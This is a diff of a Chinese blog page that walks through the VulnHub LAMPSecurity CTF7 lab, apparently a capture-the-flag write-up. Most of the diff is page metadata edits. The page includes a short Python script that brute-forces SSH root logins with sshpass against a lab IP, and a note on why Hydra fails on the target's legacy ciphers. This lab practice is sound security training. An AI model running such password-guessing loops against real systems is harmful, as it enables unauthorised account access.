@@ -6,18 +6,18 @@
   
   <title>vulnhub-LAMPSecurity-CTF7-external | thedarknessdied</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="CTF7靶机探索1. SSH root 用户弱口令​	编写一个简单的SSH弱口令爆破程序 1234567891011121314import oswith open(&quot;pass.txt&quot;, &quot;r&quot;) as f:    password_lists &#x3D; f.read().split()with open(&quot;user.txt&quot;, &quot;">
+  <meta name="description" content="CTF7靶机探索1. SSH root 用户弱口令">
 <meta property="og:type" content="article">
 <meta property="og:title" content="vulnhub-LAMPSecurity-CTF7-external">
 <meta property="og:url" content="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/index.html">
 <meta property="og:site_name" content="thedarknessdied">
-<meta property="og:description" content="CTF7靶机探索1. SSH root 用户弱口令​	编写一个简单的SSH弱口令爆破程序 1234567891011121314import oswith open(&quot;pass.txt&quot;, &quot;r&quot;) as f:    password_lists &#x3D; f.read().split()with open(&quot;user.txt&quot;, &quot;">
+<meta property="og:description" content="CTF7靶机探索1. SSH root 用户弱口令">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/image-20240321112032069.png">
 <meta property="og:image" content="http://example.com/images/image-20240321112503733.png">
 <meta property="og:image" content="http://example.com/images/image-20240321112957947.png">
 <meta property="article:published_time" content="2024-03-21T04:27:24.000Z">
-<meta property="article:modified_time" content="2024-03-21T04:30:40.577Z">
+<meta property="article:modified_time" content="2024-03-26T02:28:07.523Z">
 <meta property="article:author" content="R0seK1llere">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="vulnhub">
@@ -103,7 +103,9 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2><p>​	编写一个简单的SSH弱口令爆破程序</p>
+        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2><span id="more"></span>
+
+<p>​	编写一个简单的SSH弱口令爆破程序</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pass.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    password_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    user_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_lists:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> password_lists:</span><br><span class="line">        cmd = <span class="string">&quot;sshpass -p &#123;&#125; ssh &#123;&#125;@192.168.70.197 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+3des-cbc&quot;</span>.<span class="built_in">format</span>(password, user)</span><br><span class="line">        res = os.system(cmd)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1280</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;username: &#123;&#125;\tpassword: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, password))</span><br></pre></td></tr></table></figure>
 
 <p>​	这里为什么不适用hydra这类的工具，因为靶机的密钥加密算法版本比较老，而Hydra 是一个用于密码破解和暴力破解的工具，通常用于测试系统的安全性和进行合法的渗透测试。它主要关注用户名和密码的破解，而不是密钥算法的选择，容易遇到到了密钥算法不匹配的问题。<img src="/images/image-20240321112032069.png" alt="image-20240321112032069"></p>
@@ -119,7 +121,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu7r07h8000zgvvde0btbpdl" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu7re9km000z4bvdaswfbtq6" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
